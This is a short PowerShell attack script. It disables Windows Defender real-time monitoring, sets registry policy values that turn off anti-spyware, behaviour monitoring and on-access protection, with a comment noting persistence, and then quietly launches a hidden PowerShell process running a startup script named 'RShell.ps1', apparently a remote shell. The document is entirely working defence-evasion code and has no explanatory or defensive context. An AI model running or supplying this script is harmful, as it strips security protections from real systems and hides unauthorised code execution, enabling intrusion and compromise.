#Disables Windows Defender Real Time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true
#Creates a registry entry that disables Windows Defender, works on newer builds, repeated for persistance
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Real-Time Protection" -Name DisableBehaviorMonitoring -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Real-Time Protection" -Name DisableOnAccessProtection -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Real-Time Protection" -Name DisableScanOnRealtimeEnable -Value 1 -PropertyType DWORD -Force
#Runs scripts
Start-Process Powershell -window hidden C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\RShell.ps1